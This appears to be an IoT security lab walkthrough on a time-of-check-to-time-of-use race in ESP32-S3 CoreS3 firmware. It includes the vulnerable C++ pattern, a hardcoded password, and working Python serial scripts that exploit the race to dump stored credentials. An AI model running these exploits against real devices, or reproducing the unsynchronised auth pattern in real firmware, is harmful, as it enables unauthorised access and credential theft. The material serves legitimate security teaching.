# L27: TOCTOU Authentication Bypass

## Goal
Exploit a TOCTOU (time-of-check-time-of-use) race condition between concurrent FreeRTOS tasks to execute privileged serial commands after authentication has expired, extracting stored credentials from NVS.

## Background

**Why this matters**: TOCTOU race conditions occur when a security check and the protected action run on different execution contexts with a temporal gap between them. If security state changes during that gap, the action executes under stale authorization. On multi-core microcontrollers running FreeRTOS, this is a real concurrency bug.

**What you're looking for in IoT devices:**
- Authentication checks on one task/thread with privileged execution on another
- Shared volatile flags used for authorization without mutexes or atomic operations
- Background tasks that asynchronously clear security state (timeout handlers)
- Multi-core SoCs (ESP32-S3, STM32H7) where tasks run truly in parallel

**Why this happens:**
- `volatile` prevents compiler optimization but provides no atomicity or memory ordering
- Check-then-act patterns without mutual exclusion are inherently racy
- FreeRTOS tasks on ESP32-S3 dual-core run on separate CPU cores simultaneously
- Timeout-based session invalidation runs asynchronously from command processing

**On CoreS3**: Three concurrent FreeRTOS tasks share one `volatile bool` flag without synchronization:

1. **Serial handler** (main loop): Processes `usb-auth` and `usb-cmd`. Checks `s_usbAuthAuthorized`.
2. **Worker task** (spawned per-command): Executes the privileged action after a 250ms bus-settling delay.
3. **Auth timeout task** (background): Polls every 50ms, clears `s_usbAuthAuthorized` after 2 seconds.

The serial handler checks auth and spawns a worker. The worker delays 250ms then executes. During that delay, the timeout task can clear the flag - but the worker already passed the check.

```cpp
// From SerialShell.cpp - the shared flag (no mutex, no atomic)
static volatile bool s_usbAuthAuthorized = false;
static volatile unsigned long s_usbAuthExpiryMs = 0;

// Auth check happens HERE on the serial handler task...
void SerialShell::usbCommand(const String& cmd) {
    if (!s_usbAuthAuthorized) { return; }  // TOCTOU: check passes here
    xTaskCreatePinnedToCore(usbCmdWorker, ...);  // Dispatch to worker
}

// ...but the worker executes LATER on a different core
void usbCmdWorker(void* pvParams) {
    vTaskDelay(pdMS_TO_TICKS(250));  // 250ms delay widens the race window
    // Auth may have expired during this delay, but command still runs
    SerialShell::getInstance().dumpNVS(true);  // Privileged action executes
}
```

**Race timeline:**

```
Serial handler (Core 0)      Worker task (Core 1)       Timeout task (any core)
========================      ====================       ======================
T+0     usb-auth usbadmin
        s_usbAuthAuthorized=true
        s_usbAuthExpiryMs=T+2000

T+1800  usb-cmd dump-nvs
        CHECK: s_usbAuthAuthorized?
               YES (valid)
        xTaskCreate(worker)
                                  T+1800: task starts
                                  vTaskDelay(250ms)
                                                          T+2000: now > expiry
                                                          s_usbAuthAuthorized=false
                                                          "Session expired"
                                  T+2050: delay done
                                  EXECUTE dump-nvs
                                  (auth expired 50ms ago!)

The check (T+1800) and the use (T+2050) happen on different tasks.
No mutex protects the check-then-act sequence.
```

**Concurrent command race:**

```
Serial handler               Worker A (Core 1)    Worker B (Core 1)    Timeout
==============               ================     ================     =======
T+100: usb-cmd dump-nvs
       CHECK auth: TRUE
       spawn Worker A
                              vTaskDelay(250ms)
T+150: usb-cmd dump-nvs
       CHECK auth: TRUE
       spawn Worker B
                                                   vTaskDelay(250ms)
                              T+350: EXECUTE
                              dump-nvs
                                                   T+400: EXECUTE
                                                   dump-nvs
                                                                        T+2000:
                                                                        clear auth

Both workers passed auth check before either executed.
Two privileged operations from one authentication.
```

## Hardware Setup

**What you need:**
- CoreS3 device connected via USB-C cable
- Linux machine with Python 3 and `pyserial` (`pip install pyserial`)
- Terminal emulator: `pio device monitor`, `screen`, or `minicom`

```bash
pip install pyserial
# PlatformIO monitor is built-in, no extra install needed
# Alternatively: sudo apt install -y screen minicom

ls -la /dev/ttyACM*
# Expected: /dev/ttyACM0 (USB CDC serial)
```

## Lab Walkthrough

### Step 1: Identify the Authentication Mechanism

Discover the USB auth commands and session lifecycle.

```bash
pio device monitor -b 115200

# usb-auth is hidden (not in help). Discover via firmware RE (L04/L05)
# or: strings firmware.bin | grep -i usb

# Step A: Try a privileged command WITHOUT authentication
cores3-cam> usb-cmd dump-nvs

# Expected:
# [USB-CMD] Request: dump-nvs
# [USB-CMD] Not authorized

# Step B: Authenticate
cores3-cam> usb-auth usbadmin

# Expected:
# [USB-AUTH] Authenticated (session active)

# Step C: Wait 3 seconds (longer than 2-second window)

# Expected (after ~2 seconds):
# [USB-AUTH] Session expired (timeout)

# Step D: Try privileged command after expiry
cores3-cam> usb-cmd dump-nvs

# Expected:
# [USB-CMD] Not authorized
```

Key observations:
- Password `usbadmin` (discoverable via firmware strings or binary analysis)
- 2-second session managed by a background FreeRTOS task
- `usb-cmd` spawns a separate worker task with 250ms delay
- Three concurrent tasks share one unsynchronized `volatile bool`

### Step 2: Exploit the TOCTOU Window

Send `usb-cmd` near the 2-second boundary: auth check passes at T+1800ms, worker executes at T+2050ms (after expiry).

```python
#!/usr/bin/env python3
"""usb_toctou.py - Exploit the TOCTOU race between auth check and execution.

Usage: python3 usb_toctou.py
"""
import serial
import time

PORT = '/dev/ttyACM0'
BAUD = 115200
PASSWORD = 'usbadmin'

ser = serial.Serial(PORT, BAUD, timeout=3)
time.sleep(0.5)
ser.read(ser.in_waiting)

print("[*] Demonstrating TOCTOU race condition")
print("[*] Auth window: 2000ms, worker delay: 250ms")
print()

# Authenticate (starts 2-second timer)
ser.write(f'usb-auth {PASSWORD}\r\n'.encode())
time.sleep(0.1)
auth = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"[T+0ms]    Auth: {auth.strip()}")

# Wait until just before expiry, then send command
time.sleep(1.7)
print(f"[T+1800ms] Sending usb-cmd dump-nvs (auth check passes here)")
ser.write(b'usb-cmd dump-nvs\r\n')

# Wait for worker task to finish (250ms delay + execution)
time.sleep(1.5)
output = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"[T+2050ms] Worker executes (auth already expired):")
print(output)

if "Dumping" in output or "NVS" in output:
    print("[+] TOCTOU exploited: command ran after auth expired")

ser.close()
```

```bash
python3 usb_toctou.py

# Expected:
# [*] Demonstrating TOCTOU race condition
# [*] Auth window: 2000ms, worker delay: 250ms
#
# [T+0ms]    Auth: [USB-AUTH] Authenticated (session active)
# [T+1800ms] Sending usb-cmd dump-nvs (auth check passes here)
# [T+2050ms] Worker executes (auth already expired):
# [USB-AUTH] Session expired (timeout)
# [USB-CMD] Request: dump-nvs
# [USB-CMD] Dumping NVS (privileged)
# ...NVS contents...
#
# [+] TOCTOU exploited: command ran after auth expired
```

### Step 3: Exploit Concurrent Command Dispatch

Send multiple `usb-cmd` commands rapidly. Each spawns an independent worker that checks auth before any execute, yielding multiple privileged operations from one authentication.

```python
#!/usr/bin/env python3
"""usb_race_multi.py - Race multiple worker tasks against each other.

Usage: python3 usb_race_multi.py
"""
import serial
import time

PORT = '/dev/ttyACM0'
BAUD = 115200
PASSWORD = 'usbadmin'

ser = serial.Serial(PORT, BAUD, timeout=3)
time.sleep(0.5)
ser.read(ser.in_waiting)

# Authenticate once
print("[*] Single authentication, multiple commands")
ser.write(f'usb-auth {PASSWORD}\r\n'.encode())
time.sleep(0.1)
auth = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"    {auth.strip()}")

# Rapid-fire multiple commands
print(f"\n[*] Sending 2 commands in rapid succession...")
ser.write(b'usb-cmd dump-nvs\r\n')
time.sleep(0.02)  # 20ms gap
ser.write(b'usb-cmd dump-nvs\r\n')

time.sleep(3)
output = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"\n[+] Output:")
print(output)

success_count = output.count("Dumping NVS")
print(f"\n[+] {success_count} commands executed from 1 authentication")
if success_count > 1:
    print("[+] Race confirmed: multiple workers passed auth check")

ser.close()
```

### Step 4: Map the Race Window Boundary

Measure the exact timing boundary where TOCTOU succeeds vs fails. Commands at 1750-2000ms exploit the 250ms gap between check and execution.

```python
#!/usr/bin/env python3
"""usb_race_timing.py - Map the TOCTOU window boundary.

Usage: python3 usb_race_timing.py
"""
import serial
import time

PORT = '/dev/ttyACM0'
BAUD = 115200
PASSWORD = 'usbadmin'

test_delays = [0.5, 1.0, 1.5, 1.75, 1.9, 2.0, 2.1, 2.5]

print("[*] Mapping TOCTOU race window")
print(f"    Auth window: 2000ms, worker delay: 250ms")
print(f"    TOCTOU range: commands at 1750-2000ms exploit the gap\n")

for delay_s in test_delays:
    ser = serial.Serial(PORT, BAUD, timeout=3)
    time.sleep(0.3)
    ser.read(ser.in_waiting)

    ser.write(f'usb-auth {PASSWORD}\r\n'.encode())
    time.sleep(0.1)
    ser.read(ser.in_waiting)

    time.sleep(delay_s)
    ser.write(b'usb-cmd dump-nvs\r\n')
    time.sleep(1.5)
    output = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')

    authorized = "Dumping" in output
    toctou = delay_s >= 1.75
    status = "EXECUTED" if authorized else "REJECTED"
    note = " (TOCTOU)" if authorized and toctou else ""
    print(f"  Delay {delay_s:.2f}s: {status}{note}")

    ser.close()
    time.sleep(1)

# Expected results:
#   Delay 0.50s: EXECUTED           (auth valid at check AND execution)
#   Delay 1.00s: EXECUTED           (auth valid at check AND execution)
#   Delay 1.50s: EXECUTED           (auth valid at check AND execution)
#   Delay 1.75s: EXECUTED (TOCTOU)  (auth valid at check, expired at execution)
#   Delay 1.90s: EXECUTED (TOCTOU)  (auth valid at check, expired at execution)
#   Delay 2.00s: REJECTED           (auth expired before check)
#   Delay 2.10s: REJECTED           (auth expired before check)
#   Delay 2.50s: REJECTED           (auth expired before check)
```

### Step 5: Extract Secrets from NVS Dump

Parse the NVS dump from the successful race exploit to extract stored credentials.

```bash
python3 << 'EOF'
# Example NVS dump output (replace with actual captured output)
nvs_dump = """
=== NVS Dump (Key/Value Pairs) ===
Key: user_pin             Type: STR   Value: "XXXXXX"
Key: admin_pin            Type: STR   Value: "YYYYYY"
Key: wifi_ssid            Type: STR   Value: "CoreS3-CAM-26EEFC"
Key: wifi_pass            Type: STR   Value: ""
"""

import re
print("[+] Parsed NVS credentials:")
for line in nvs_dump.strip().split('\n'):
    m = re.match(r'Key:\s+(\S+)\s+Type:\s+\S+\s+Value:\s+"?(.*?)"?\s*$', line)
    if m:
        print(f"    {m.group(1)} = {m.group(2)}")
EOF
```

## Impact

- **Genuine TOCTOU on dual-core ESP32-S3**: Auth check on Core 0 serial handler, privileged execution on Core 1 worker task after 250ms delay, sharing a `volatile bool` without mutex.
- **250ms race window**: Commands at 1750-2000ms after auth pass the check but execute after expiry.
- **Multiple commands per auth**: Rapid `usb-cmd` invocations each spawn independent workers, all passing auth before any execute.
- **No atomic invalidation**: The `volatile bool` provides no mutual exclusion between check-then-act and timeout clear.
- **Weak password**: `usbadmin` is hardcoded (discoverable via strings or firmware dump).
- **Real-world parallel**: TOCTOU in authentication found in smart lock BLE (CVE-2019-13143), automotive key fob relays, and SCADA serial protocols with fixed session windows.

## References

- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
- [FreeRTOS SMP on ESP32-S3](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-guides/freertos-smp.html)
- [POSIX Thread Safety and TOCTOU](https://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
